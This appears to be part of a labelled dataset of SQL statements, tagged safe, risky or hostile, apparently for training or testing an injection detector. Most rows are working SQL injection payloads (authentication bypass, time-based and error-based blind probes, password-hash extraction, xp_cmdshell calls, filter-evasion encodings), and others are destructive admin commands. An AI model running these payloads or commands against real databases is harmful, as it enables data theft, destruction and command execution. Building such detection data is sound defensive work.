+1148,sl_time_blind,hostile,"SELECT id, title FROM accounts WHERE title = '' or benchmark(10000000,MD5(1))#"
+1149,sl_auth_bypass,hostile,"SELECT id, name FROM products WHERE name = 'extractvalue(floor(0),concat(0x0a,unhex(hex(user()))))"
+1150,admin_op,risky,GRANT ALTER ON reviews.* TO 'app'@'%'
+1151,sl_generic,hostile,SELECT * FROM members WHERE (email = 'x') or (a=a
+1152,schema_change,risky,ALTER TABLE coupons MODIFY COLUMN created_at VARCHAR(32) NOT NULL
+1153,sl_boolean_blind,hostile,"SELECT id, title FROM products WHERE title = 'MAKE_SET(3271=3271,4471)"
+1154,sl_auth_bypass,hostile,"SELECT id, username FROM members WHERE username = '' or --+2=- -!!!'2"
+1155,sl_time_blind,hostile,"SELECT * FROM sessions WHERE (title = 'x'') or benchmark(10000000,MD5(1))#"
+1156,sl_time_blind,hostile,"SELECT id, name FROM orders WHERE name = '(CASE WHEN (3271=3271) THEN (SELECT BENCHMARK(5000000,MD5(''qxjkp''))) ELSE 3271 END)"
+1157,sl_auth_bypass,hostile,"SELECT id, email FROM products WHERE email = 'root') or '1'='1'#"
+1158,read_join_agg,safe,"SELECT a.status, COUNT(b.id) AS cnt FROM shops a JOIN payments b ON b.shop_id = a.id WHERE a.id = 2048 GROUP BY a.status ORDER BY cnt DESC LIMIT 50"
+1159,sl_auth_bypass,hostile,"SELECT id, username FROM accounts WHERE username = 'root'or 1=1 or ''='"
+1160,sl_error_based,hostile,SELECT * FROM sessions WHERE id = 1 AND 3271=CAST('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'qpbxq' AS NUMERIC)
+1161,sl_auth_bypass,hostile,"SELECT id, title FROM orders WHERE title = ''OR 1=1--"
+1162,read_join_agg,safe,"SELECT a.amount, COUNT(b.id) AS cnt FROM coupons a JOIN products b ON b.shop_id = a.id WHERE a.created_at >= '2026-09-01' GROUP BY a.amount ORDER BY cnt DESC LIMIT 50"
+1163,sl_oracle,hostile,"SELECT id, title FROM orders WHERE title = '' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i"
+1164,sl_auth_bypass,hostile,"SELECT id, name FROM sessions WHERE name = '?query=1' || if(ascii(substr((/*!select*/ */*a!*/from test.flag),1,1))=97,1,0)%23"
+1165,sl_time_blind,hostile,"SELECT id, username FROM members WHERE username = '"" or benchmark(10000000,MD5(1))#"
+1166,read_simple,safe,"SELECT updated_at, title FROM carts WHERE amount = 1299.00 LIMIT 100"
+1167,read_simple,safe,"SELECT title, amount FROM products WHERE email = 'carol@mail.com' LIMIT 50"
+1168,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM orders a JOIN carts b ON b.shop_id = a.id WHERE a.id = 9912 GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+1169,sl_time_blind,hostile,"SELECT id, name FROM accounts WHERE name = ',(SELECT (CASE WHEN (3271=3271) THEN !SLEEP(5) ELSE 3271 END))"
+1170,sl_auth_bypass,hostile,"SELECT id, name FROM sessions WHERE name = '' or 'a' = n'a # unicode"
+1171,admin_op,risky,REVOKE ALTER ON reviews FROM 'migration'@'%'
+1172,sl_generic,hostile,"SELECT id, title FROM members WHERE title = '' or uid like '%"
+1173,read_simple,safe,"SELECT id, user_id FROM refunds WHERE created_at >= '2026-06-30' LIMIT 20"
+1174,waf_encoding,hostile,SELECT * FROM t WHERE name = 'a' OR 'a' = x'61'
+1175,sl_time_blind,hostile,"SELECT id, username FROM accounts WHERE username = '(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)"
+1176,read_simple,safe,"SELECT id, created_at FROM shops WHERE updated_at >= '2026-03-15' LIMIT 10"
+1177,sl_generic,hostile,SELECT * FROM sessions WHERE id = 1 or 1/*
+1178,admin_op,risky,REVOKE INSERT ON sessions FROM 'migration'@'%'
+1179,sl_auth_bypass,hostile,"SELECT id, title FROM members WHERE title = '?did=-2%0Aunion–%0Aselect%0Auser()"
+1180,read_simple,safe,"SELECT status, created_at FROM users WHERE updated_at >= '2026-03-15' LIMIT 50"
+1181,read_simple,safe,"SELECT created_at, status FROM products WHERE amount = 8.00 LIMIT 20"
+1182,sl_generic,hostile,SELECT * FROM orders WHERE id = 1 or 'text' = n'text'
+1183,sl_auth_bypass,hostile,"SELECT id, title FROM accounts WHERE title = '.and 1=(select ""/*"") union all select 1,@@version,3,4,5 from mysql.user-- */"
+1184,sl_file_enum,hostile,SELECT * FROM accounts WHERE id = 1 exec master..xp_cmdshell 'net+users'
+1185,write_bounded,safe,UPDATE refunds SET updated_at = '2026-08-20' WHERE id = 42
+1186,read_simple,safe,"SELECT updated_at, created_at FROM reviews WHERE name = 'Daniel Ma' LIMIT 50"
+1187,sl_auth_bypass,hostile,"SELECT id, code FROM sessions WHERE code = 'where id=.1union/*.1*/select(1)"
+1188,sl_time_blind,hostile,"SELECT id, email FROM sessions WHERE email = ',(SELECT (CASE WHEN (3271=3271) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),500000000),NULL))) ELSE 3271/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))"
+1189,sl_time_blind,hostile,"SELECT * FROM accounts WHERE id = 1 OR ELT(3271=3271,SLEEP(5))"
+1190,read_simple,safe,"SELECT email, id FROM carts WHERE name = 'Carol Wu' LIMIT 20"
+1191,write_bounded,safe,DELETE FROM sessions WHERE id = 2048 AND status = 'active'
+1192,sl_auth_bypass,hostile,"SELECT id, email FROM users WHERE email = '"" or 1=1#"
+1193,admin_op,risky,REVOKE UPDATE ON reviews FROM 'ops'@'%'
+1194,sl_oracle,hostile,"SELECT id, title FROM accounts WHERE title = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i"
+1195,legit_risky,risky,SET GLOBAL foreign_key_checks = 0
+1196,read_simple,safe,"SELECT id, name FROM refunds WHERE email = 'alice@example.com' LIMIT 20"
+1197,sl_boolean_blind,hostile,SELECT * FROM users WHERE id = 1 ;SELECT (CASE WHEN (3271=3271) THEN 3271 ELSE 1/(SELECT 0) END)
+1198,sl_generic,hostile,"SELECT id, username FROM sessions WHERE username = '' or user like '%"
+1199,sl_auth_bypass,hostile,"SELECT id, title FROM members WHERE title = 'floor(pi()) 3 floor(pi()*pi()+pi()) 13 D ceil((pi()+ceil(pi()))*pi()) 23 N"
+1200,sl_generic,hostile,SELECT * FROM users WHERE id = 1 or 0=0 #
+1201,sl_time_blind,hostile,"SELECT * FROM users WHERE (username = 'x'"")) or sleep(5)="""
+1202,read_join_agg,safe,"SELECT a.user_id, COUNT(b.id) AS cnt FROM reviews a JOIN payments b ON b.user_id = a.id WHERE a.created_at >= '2026-09-01' GROUP BY a.user_id ORDER BY cnt DESC LIMIT 50"
+1203,sl_auth_bypass,hostile,"SELECT id, username FROM accounts WHERE username = '?query=1%27>(select.``.schema_name from (select.``.schema_name,if(ascii(mid((select * from test.flag),1,1))=102,(benchmark(5000000,sha(1))),1) from information_schema.schemata)x)%23"
+1204,sl_generic,hostile,"SELECT id, username FROM accounts WHERE username = ''; exec xp_regread"
+1205,sl_generic,hostile,"SELECT id, code FROM members WHERE code = '""hi"""") or (""""a""""=""""a"""
+1206,sl_error_based,hostile,"SELECT id, username FROM members WHERE username = ',(CAST('qjvkq'||(SELECT 1 FROM GENERATE_SERIES(3271,3271,CASE WHEN (3271=3271) THEN 1 ELSE 0 END) LIMIT 1)::text||'qpbxq' AS NUMERIC))"
+1207,admin_op,risky,SET GLOBAL wait_timeout = 64
+1208,sl_auth_bypass,hostile,"SELECT * FROM sessions WHERE id = 1 select * from user where host ='localhost' && 0=0 limit 0,1;"
+1209,unbounded_write,risky,UPDATE reviews SET status = 'refunded'
+1210,sl_time_blind,hostile,SELECT * FROM users WHERE (name = 'x'));waitfor delay '0:0:5'--
+1211,sl_time_blind,hostile,"SELECT id, username FROM members WHERE username = '(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)"
+1212,schema_change,risky,TRUNCATE TABLE carts
+1213,sl_oracle,hostile,"SELECT id, title FROM members WHERE title = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i"
+1214,write_bounded,safe,"INSERT INTO coupons (id, email) VALUES (9912, 'bob@shop.io')"
+1215,schema_change,risky,ALTER TABLE products MODIFY COLUMN name VARCHAR(32) NOT NULL
+1216,waf_encoding,hostile,SELECT 0x457578
+1217,schema_change,risky,ALTER TABLE sessions DROP COLUMN id
+1218,sl_oracle,hostile,"SELECT id, code FROM users WHERE code = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i"
+1219,sl_mssql,hostile,"SELECT id, title FROM orders WHERE title = '' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --"
+1220,unbounded_write,risky,UPDATE reviews SET amount = 8.00
+1221,waf_comment,hostile,"SELECT * FROM t WHERE id = 1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4"
+1222,write_bounded,safe,DELETE FROM shops WHERE id = 100 AND created_at >= '2026-06-30'
+1223,sl_time_blind,hostile,SELECT * FROM products WHERE id = 1 AND (SELECT 3271 FROM (SELECT(!SLEEP(5)))'qxjkp')
+1224,write_bounded,safe,DELETE FROM payments WHERE id = 42 AND updated_at >= '2026-03-15'
+1225,read_simple,safe,"SELECT status, title FROM shops WHERE status = 'pending' LIMIT 10"
+1226,sl_inline_query,hostile,SELECT * FROM members WHERE id = 1 SELECT 'qjvkq'||(CASE WHEN (3271=3271) THEN 1 ELSE 0 END)||'qpbxq'
+1227,admin_op,risky,GRANT SELECT ON products.* TO 'etl'@'%'
+1228,read_join_agg,safe,"SELECT a.name, COUNT(b.id) AS cnt FROM sessions a JOIN carts b ON b.shop_id = a.id WHERE a.user_id = 3 GROUP BY a.name ORDER BY cnt DESC LIMIT 50"
+1229,sl_time_blind,hostile,"SELECT id, code FROM sessions WHERE code = '(SELECT (CASE WHEN (3271=3271) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3271),0),500000000),NULL) ELSE ''qxjkp'' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)"
+1230,sl_union,hostile,"SELECT id, email FROM sessions WHERE email = '' UNION SELECT"
+1231,sl_error_based,hostile,"SELECT id, username FROM accounts WHERE username = ',(SELECT 3271 WHERE 3271=CONVERT(INT,(SELECT 'qjvkq'+(SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END))+'qpbxq')))"
+1232,sl_auth_bypass,hostile,"SELECT * FROM sessions WHERE id = 9999.and '1'=(select '-- ') union all select 1,2,3"
+1233,sl_boolean_blind,hostile,SELECT * FROM sessions WHERE id = 1 ;SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 3271*(SELECT 3271 UNION ALL SELECT 4471) END)
+1234,read_simple,safe,"SELECT amount, id FROM products WHERE updated_at >= '2026-03-15' LIMIT 100"
+1235,sl_oracle,hostile,"SELECT id, email FROM orders WHERE email = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i"
+1236,admin_op,risky,GRANT DROP ON products.* TO 'analytics'@'%'
+1237,sl_error_based,hostile,"SELECT * FROM users WHERE id = 1 OR (SELECT 3271 FROM(SELECT COUNT(*),CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
+1238,schema_change,risky,TRUNCATE TABLE reviews
+1239,sl_time_blind,hostile,"SELECT * FROM products WHERE id = 1 AND ELT(3271=3271,SLEEP(5))"
+1240,json_sqli,hostile,"SELECT * FROM t WHERE JSON_EXTRACT(payload,'$.id') = 1 UNION SELECT password_hash FROM users"
+1241,sl_boolean_blind,hostile,SELECT * FROM members WHERE id = 1 ;IF(3271=3271) SELECT 3271 ELSE DROP FUNCTION 'qxjkp'
+1242,schema_change,risky,ALTER TABLE users DROP COLUMN shop_id
+1243,sl_time_blind,hostile,SELECT * FROM members WHERE (title = 'x'');waitfor delay '0:0:5'--
+1244,read_join_agg,safe,"SELECT a.id, COUNT(b.id) AS cnt FROM shops a JOIN sessions b ON b.shop_id = a.id WHERE a.status = 'active' GROUP BY a.id ORDER BY cnt DESC LIMIT 50"
+1245,unbounded_write,risky,UPDATE shops SET title = 'Free Shipping'
+1246,sl_auth_bypass,hostile,"SELECT * FROM users WHERE id = 1' /*!UNION/**//**/ALL*//*!SELECT*//*!USER*/(),/*!USER*/()#"
+1247,sl_auth_bypass,hostile,"SELECT id, code FROM users WHERE code = '' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '"
+1248,sl_auth_bypass,hostile,"SELECT id, username FROM accounts WHERE username = 'floor(version()+pi()) 8 ceil(pi()*version())+true 18 ceil(pi()*pi()*pi()-pi()) 28"
+1249,sl_time_blind,hostile,SELECT * FROM sessions WHERE id = 1 or sleep(5)='
+1250,sl_auth_bypass,hostile,"SELECT id, username FROM sessions WHERE username = 'root') or ('1'='1"
+1251,read_simple,safe,"SELECT name, email FROM sessions WHERE user_id = 3 LIMIT 50"
+1252,sl_time_blind,hostile,SELECT * FROM orders WHERE (name = 'x'')) or sleep(5)='
+1253,read_simple,safe,"SELECT created_at, title FROM reviews WHERE created_at >= '2026-01-01' LIMIT 50"
+1254,sl_error_based,hostile,"SELECT * FROM products WHERE id = 1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq')) USING utf8)))"
+1255,sl_generic,hostile,"SELECT id, title FROM orders WHERE title = '%20or%20'x'='x"
+1256,admin_op,risky,REVOKE DROP ON payments FROM 'migration'@'%'
+1257,sl_generic,hostile,"SELECT id, code FROM orders WHERE code = 'admin') or ('1'='1'#"
+1258,sl_auth_bypass,hostile,SELECT * FROM orders WHERE id = 1' unIoN SeLect 1
+1259,sl_time_blind,hostile,"SELECT id, name FROM orders WHERE name = 'sleep(5)#"
+1260,sl_time_blind,hostile,SELECT * FROM orders WHERE id = 1)) or pg_sleep(5)--
+1261,sl_stacked,hostile,"SELECT * FROM members WHERE id = 1 ;SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4"
+1262,sl_mssql,hostile,"SELECT id, email FROM users WHERE email = '' union (select NULL, NULL, NULL, NULL,  (select @@version)) --"
+1263,sl_generic,hostile,"SELECT id, username FROM products WHERE username = '"" or true--"
+1264,sl_time_blind,hostile,"SELECT * FROM products WHERE id = 1 AND 3271=(SELECT COUNT(fuzzBits(''qxjkp'', 0.001)) FROM numbers(1000000))"
+1265,sl_generic,hostile,"SELECT id, code FROM products WHERE code = '%20or%201=1"
+1266,sl_generic,hostile,SELECT * FROM accounts WHERE id = 1 or 1=1#
+1267,sl_generic,hostile,SELECT * FROM accounts WHERE id = 1 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+1268,read_join_agg,safe,"SELECT a.user_id, COUNT(b.id) AS cnt FROM users a JOIN carts b ON b.shop_id = a.id WHERE a.email = 'carol@mail.com' GROUP BY a.user_id ORDER BY cnt DESC LIMIT 50"
+1269,sl_auth_bypass,hostile,"SELECT id, email FROM users WHERE email = '?spm=5176.100241.0.0.eViKRY?id=1%20union%23%0Aselect%20user%20from%20ddd"
+1270,sl_error_based,hostile,"SELECT id, name FROM sessions WHERE name = ',(SELECT 3271=('qjvkq'||(SELECT CASE 3271 WHEN 3271 THEN 1 ELSE 0 END FROM RDB$DATABASE)||'qpbxq'))"
+1271,admin_op,risky,GRANT DELETE ON refunds.* TO 'migration'@'%'
+1272,sl_auth_bypass,hostile,"SELECT id, email FROM products WHERE email = 'sql=select%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2a%20from%20manager"
+1273,sl_boolean_blind,hostile,"SELECT id, name FROM products WHERE name = '(SELECT (CASE WHEN (3271=3271) THEN 3271 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"
+1274,sl_time_blind,hostile,"SELECT id, name FROM sessions WHERE name = ',(BEGIN IF (3271=3271) THEN DBMS_SESSION.SLEEP(5); ELSE DBMS_SESSION.SLEEP(0); END IF; END;)"
+1275,sl_generic,hostile,SELECT * FROM members WHERE (email = 'x'')%20or%20('x'='x
+1276,sl_mssql,hostile,"SELECT id, name FROM sessions WHERE name = '' union (select NULL, NULL, NULL,  (select @@version)) --"
+1277,waf_keyword,hostile,SELECT{x table_name}FROM{x information_schema.tables}
+1278,sl_generic,hostile,"SELECT id, name FROM users WHERE name = '' or userid like '%"
+1279,sl_time_blind,hostile,SELECT * FROM members WHERE id = 1 OR 3271=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
+1280,schema_change,risky,ALTER TABLE coupons MODIFY COLUMN email VARCHAR(32) NOT NULL
+1281,admin_op,risky,GRANT INSERT ON coupons.* TO 'etl'@'%'
+1282,sl_boolean_blind,hostile,"SELECT * FROM members WHERE id = 1 OR ELT(3271=3271,4471)"
+1283,unbounded_write,risky,UPDATE reviews SET status = 'cancelled'
+1284,read_simple,safe,"SELECT title, email FROM users WHERE updated_at >= '2025-12-31' LIMIT 50"
+1285,sl_time_blind,hostile,"SELECT id, title FROM members WHERE title = '(SELECT 3271 FROM (SELECT(!SLEEP(5)))'qxjkp')"
+1286,blind_boolean,hostile,"SELECT * FROM t WHERE id = 1 AND ASCII(LOWER(MID((SELECT pw FROM users LIMIT 1), 1, 1))) = 74"
+1287,read_join_agg,safe,"SELECT a.shop_id, COUNT(b.id) AS cnt FROM reviews a JOIN shops b ON b.user_id = a.id WHERE a.status = 'refunded' GROUP BY a.shop_id ORDER BY cnt DESC LIMIT 50"
+1288,sl_generic,hostile,"SELECT id, email FROM users WHERE email = 'admin' or 1=1--"
+1289,sl_error_based,hostile,"SELECT * FROM accounts WHERE id = 1 OR 3271=UUID_TO_BIN(CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'))"
+1290,read_simple,safe,"SELECT shop_id, id FROM carts WHERE shop_id = 364 LIMIT 20"
+1291,schema_change,risky,ALTER TABLE shops MODIFY COLUMN shop_id VARCHAR(32) NOT NULL
+1292,sl_generic,hostile,"SELECT id, title FROM members WHERE title = '' or ''&'"
+1293,legit_lookalike,safe,"/* 月度对账 */ SELECT shop_id, SUM(amount) FROM payments WHERE created_at >= '2026-09-01' GROUP BY shop_id"
+1294,admin_op,risky,GRANT SELECT ON products.* TO 'readonly'@'%'
+1295,admin_op,risky,GRANT ALTER ON sessions.* TO 'ops'@'%'
+1296,write_bounded,safe,"INSERT INTO coupons (name, shop_id) VALUES ('Daniel Ma', 364)"
+1297,sl_generic,hostile,SELECT * FROM users WHERE id = 1 or 1=1
+1298,sl_oracle,hostile,"SELECT id, username FROM sessions WHERE username = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i"
+1299,sl_generic,hostile,"SELECT id, username FROM sessions WHERE username = '' or ''-'"
+1300,sl_error_based,hostile,SELECT * FROM orders WHERE id = 1 OR 3271=CAST('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END))::text||'qpbxq' AS NUMERIC)
+1301,read_join_agg,safe,"SELECT a.email, COUNT(b.id) AS cnt FROM payments a JOIN orders b ON b.user_id = a.id WHERE a.user_id = 88 GROUP BY a.email ORDER BY cnt DESC LIMIT 50"
+1302,sl_stacked,hostile,"SELECT * FROM products WHERE id = 1 ;SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)"
+1303,sl_oracle,hostile,"SELECT id, name FROM users WHERE name = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i"
+1304,write_bounded,safe,"INSERT INTO sessions (created_at, user_id) VALUES ('2026-06-30', 1204)"
+1305,schema_change,risky,ALTER TABLE orders DROP COLUMN email
+1306,read_simple,safe,"SELECT amount, id FROM shops WHERE updated_at >= '2026-08-20' LIMIT 20"
+1307,schema_change,risky,ALTER TABLE reviews DROP COLUMN name
+1308,admin_op,risky,GRANT UPDATE ON reviews.* TO 'migration'@'%'
+1309,sl_boolean_blind,hostile,"SELECT id, name FROM orders WHERE name = '(SELECT 1 FROM GENERATE_SERIES(3271,3271,CASE WHEN (3271=3271) THEN 1 ELSE 0 END) LIMIT 1)"
+1310,sl_generic,hostile,"SELECT id, username FROM products WHERE username = ''sqlattempt1"
+1311,read_simple,safe,"SELECT shop_id, created_at FROM products WHERE updated_at >= '2026-08-20' LIMIT 50"
+1312,sl_error_based,hostile,"SELECT id, name FROM users WHERE name = ',(SELECT 3271 FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq','x'))x)))s)"
+1313,sl_oracle,hostile,"SELECT id, title FROM orders WHERE title = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i"
+1314,union_based,hostile,"SELECT id, name FROM news UNION SELECT 1, 'anotheruser'"
+1315,sl_auth_bypass,hostile,"SELECT id, name FROM accounts WHERE name = 'root"") or (""1""=""1"
+1316,legit_risky,risky,DELETE FROM sessions WHERE expires_at < '2026-01-01'
+1317,admin_op,risky,SET GLOBAL wait_timeout = 1
+1318,sl_generic,hostile,"SELECT id, username FROM sessions WHERE username = '"" or """"*"""
+1319,unbounded_write,risky,UPDATE orders SET title = 'Summer Sale'
+1320,sl_generic,hostile,"SELECT id, name FROM users WHERE name = '' or ''='"
+1321,schema_change,risky,TRUNCATE TABLE coupons
+1322,schema_change,risky,ALTER TABLE orders MODIFY COLUMN id VARCHAR(32) NOT NULL
+1323,legit_lookalike,safe,"SELECT u.id, COUNT(o.id) FROM users u LEFT JOIN orders o ON o.user_id = u.id GROUP BY u.id HAVING COUNT(o.id) = 0"
+1324,read_join_agg,safe,"SELECT a.status, COUNT(b.id) AS cnt FROM orders a JOIN products b ON b.user_id = a.id WHERE a.user_id = 88 GROUP BY a.status ORDER BY cnt DESC LIMIT 50"
+1325,sl_time_blind,hostile,SELECT * FROM accounts WHERE id = 1 or sleep(5)#
+1326,sl_oracle,hostile,"SELECT id, code FROM sessions WHERE code = '' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i"
+1327,sl_time_blind,hostile,"SELECT * FROM sessions WHERE id = 1 OR ''qxjkp''=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),500000000),NULL)"
+1328,admin_op,risky,GRANT ALTER ON sessions.* TO 'etl'@'%'
+1329,sl_time_blind,hostile,"SELECT id, title FROM accounts WHERE title = 'ELT(3271=3271,SLEEP(5))"
+1330,sl_generic,hostile,"SELECT id, title FROM products WHERE title = 'a' or 'a' = 'a"
+1331,sl_auth_bypass,hostile,"SELECT id, code FROM users WHERE code = 'id=/*%27%20union%20select%201,2,3,4%20from%20admin%23*/"
+1332,sl_generic,hostile,"SELECT id, email FROM members WHERE email = '' or a=a--"
+1333,admin_op,risky,GRANT INSERT ON refunds.* TO 'readonly'@'%'
+1334,sl_oracle,hostile,"SELECT id, username FROM products WHERE username = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i"
+1335,sl_error_based,hostile,"SELECT * FROM users WHERE id = 1 AND 3271=JSON_EXTRACT('{}','qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END))||'qpbxq')"
+1336,sl_error_based,hostile,"SELECT id, username FROM users WHERE username = 'GTID_SUBSET(CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'),3271)"
+1337,unbounded_write,risky,UPDATE payments SET amount = 8.00
+1338,sl_boolean_blind,hostile,"SELECT id, title FROM users WHERE title = '(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE (SELECT 4471 UNION SELECT 8812) END))"
+1339,sl_error_based,hostile,SELECT * FROM products WHERE id = 1 OR 3271=CAST('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'qpbxq' AS NUMERIC)
+1340,sl_generic,hostile,"SELECT id, username FROM orders WHERE username = '; exec master..xp_cmdshell"
+1341,sl_boolean_blind,hostile,"SELECT id, name FROM orders WHERE name = 'HAVING 3271=3271"
+1342,sl_error_based,hostile,"SELECT id, username FROM sessions WHERE username = 'JSON_KEYS((SELECT CONVERT((SELECT CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq')) USING utf8)))"
+1343,sl_generic,hostile,"SELECT id, email FROM orders WHERE email = ''; exec master..xp_cmdshell"
+1344,write_bounded,safe,"INSERT INTO refunds (id, user_id) VALUES (317, 1204)"
+1345,read_join_agg,safe,"SELECT a.amount, COUNT(b.id) AS cnt FROM payments a JOIN sessions b ON b.user_id = a.id WHERE a.created_at >= '2026-01-01' GROUP BY a.amount ORDER BY cnt DESC LIMIT 50"
+1346,sl_error_based,hostile,"SELECT * FROM products WHERE id = 1 AND UPDATEXML(3271,CONCAT('.','qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'),4471)"
+1347,sl_error_based,hostile,SELECT * FROM products WHERE id = 1 OR 3271=INET_ATON('qjvkq'||(SELECT CASE WHEN (3271=3271) THEN 1 ELSE 0 END)||'qpbxq')
+1348,sl_auth_bypass,hostile,"SELECT id, code FROM products WHERE code = 'root"") or ""1""=""1""--"
+1349,schema_change,risky,ALTER TABLE shops MODIFY COLUMN name VARCHAR(32) NOT NULL
+1350,sl_error_based,hostile,SELECT * FROM sessions WHERE id = 1 OR 3271=('qjvkq'||(SELECT CASE 3271 WHEN 3271 THEN CODE(49) ELSE CODE(48) END)||'qpbxq')
+1351,sl_auth_bypass,hostile,"SELECT id, name FROM sessions WHERE name = 'foo'div count(select`pass`from(users)where mid(pass,1,1)rlike\nlower(conv(10,pi()*pi(),pi()*pi())) )-'0"
+1352,sl_generic,hostile,"SELECT id, username FROM sessions WHERE username = 't'exec master..xp_cmdshell 'nslookup www.google.com'--"
+1353,admin_op,risky,GRANT ALTER ON sessions.* TO 'app'@'%'
+1354,sl_generic,hostile,"SELECT id, username FROM accounts WHERE username = 'admin' or 1=1"
+1355,sl_error_based,hostile,"SELECT * FROM members WHERE id = 1 AND 3271=bit_shift(CAST('qjvkq'||(SELECT CASE WHEN (3271=3271) THEN 1 ELSE 0 END)||'qpbxq' AS INTEGER),1)"
+1356,blind_boolean,hostile,SELECT * FROM t WHERE id = 1 AND (SELECT COUNT(*) FROM information_schema.tables) > 100
+1357,read_join_agg,safe,"SELECT a.shop_id, COUNT(b.id) AS cnt FROM users a JOIN shops b ON b.shop_id = a.id WHERE a.name = 'Carol Wu' GROUP BY a.shop_id ORDER BY cnt DESC LIMIT 50"
+1358,sl_error_based,hostile,"SELECT * FROM users WHERE id = 1 OR 3271=bit_shift(CAST('qjvkq'||(SELECT CASE WHEN (3271=3271) THEN 1 ELSE 0 END)||'qpbxq' AS INTEGER),1)"
+1359,sl_auth_bypass,hostile,"SELECT id, title FROM accounts WHERE title = 'id=08Eunion select"
+1360,sl_auth_bypass,hostile,"SELECT id, email FROM users WHERE email = 'root"") or ""1""=""1"
+1361,json_sqli,hostile,"SELECT JSON_EXTRACT(cred,'$.api_key') FROM shops"
+1362,sl_time_blind,hostile,SELECT * FROM sessions WHERE id = 1) or sleep(5)#
+1363,sl_auth_bypass,hostile,"SELECT id, code FROM members WHERE code = 'floor(version()+pi()) 8 ceil(pi()*version())+true 18 I ceil(pi()*pi()*pi()-pi()) 28 S"
+1364,admin_op,risky,REVOKE INSERT ON reviews FROM 'migration'@'%'
